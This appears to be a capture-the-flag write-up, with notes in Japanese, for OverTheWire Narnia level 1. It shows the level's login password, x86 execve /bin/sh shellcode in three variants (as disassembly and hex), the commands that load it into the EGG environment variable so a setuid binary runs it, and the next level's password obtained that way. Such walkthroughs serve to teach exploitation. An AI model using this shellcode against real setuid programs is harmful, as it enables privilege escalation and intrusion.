```sh
$ ssh -p 2226 narnia1@narnia.labs.overthewire.org
```

password: efeidiedae

```sh
$ scp -P 2226 narnia1@narnia.labs.overthewire.org:/narnia/narnia1 .
```

```sh
$ file narnia1
narnia1: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=981de9cec9aa0c997cb4357657ba5b4f3ce3a294, not stripped
```

```sh
$ objdump -d -M intel narnia1 > narnia1.dis`
```

```
gdb-peda$ x/20 0x8048570
0x8048570:  0x00474745 -> EGG
```


EGGという環境変数を取得。

最終的にそのEGGをcallする

任意のアドレスへjmpできるということ？


シェルコードを流し込む


```asm
08048060 <_start>:
8048060: 31 c0                 xor    %eax,%eax
8048062: 50                    push   %eax
8048063: 68 2f 2f 73 68        push   $0x68732f2f
8048068: 68 2f 62 69 6e        push   $0x6e69622f
804806d: 89 e3                 mov    %esp,%ebx
804806f: 89 c1                 mov    %eax,%ecx
8048071: 89 c2                 mov    %eax,%edx
8048073: b0 0b                 mov    $0xb,%al
8048075: cd 80                 int    $0x80
8048077: 31 c0                 xor    %eax,%eax
8048079: 40                    inc    %eax
804807a: cd 80                 int    $0x80
```


```
export EGG=$(echo -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")
```

```sh
narnia1@narnia:/etc/narnia_pass$ export EGG=$(echo -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")
narnia1@narnia:/etc/narnia_pass$ /narnia/narnia1
Trying to execute EGG!
$ cat narnia2
nairiepecu
```

```
export EGG=$(echo -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80")でもいける
```

int 0x80でシステムコールを呼ぶ
この場合はeaxにシステムコール番号を入れる。execveは11( /usr/include/asm/unistd_32.h )なので0xbを入れる



```asm
80483db: 31 c0                 xor    eax,eax
80483dd: 50                    push   eax
80483de: 68 2f 2f 73 68        push   0x68732f2f
80483e3: 68 2f 62 69 6e        push   0x6e69622f
80483e8: 54                    push   esp
80483e9: 5b                    pop    ebx
80483ea: 50                    push   eax
80483eb: 59                    pop    ecx
80483ec: 50                    push   eax
80483ed: 5a                    pop    edx
80483ee: 6a 0b                 push   0xb
80483f0: 58                    pop    eax
80483f1: cd 80                 int    0x80
```

```
export EGG=$(echo -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x59\x50\x5a\x6a\x0b\x58\xcd\x80")
```
